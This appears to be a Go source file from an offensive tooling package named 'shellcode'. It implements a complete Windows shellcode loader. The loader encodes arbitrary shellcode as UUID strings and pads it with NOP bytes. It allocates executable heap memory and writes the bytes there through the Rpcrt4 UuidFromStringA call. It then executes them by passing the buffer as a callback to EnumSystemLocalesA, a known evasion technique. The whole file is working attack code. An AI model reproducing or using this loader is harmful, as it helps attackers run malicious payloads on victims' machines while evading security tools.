package shellcode

import (
  "bytes"
  "fmt"
  "unsafe"
  "github.com/google/uuid"
  "golang.org/x/sys/windows"
  "encoding/binary"
)

func UuidFromStringA(shellcode []byte) (error) {
	uuids, err := shellcodeToUUID(shellcode)
	if err != nil {
		return err
	}

	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")
	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")

	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
	if heapAddr == 0 {
		return err
  }

	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
		return err
	}

	addrPtr := addr
	for _, uuid := range uuids {
		u := append([]byte(uuid), 0)

		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
		if rpcStatus != 0 {
			return err
		}
		addrPtr += 16
	}

	ret, _, err := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
    return err
	}
  return nil
}

func shellcodeToUUID(shellcode []byte) ([]string, error) {
  if 16-len(shellcode)%16 < 16 {
    pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
    shellcode = append(shellcode, pad...)
  }

	var uuids []string
	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
    if err != nil {
      return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
    }

    uuids = append(uuids, u.String())
  }
  return uuids, nil
}


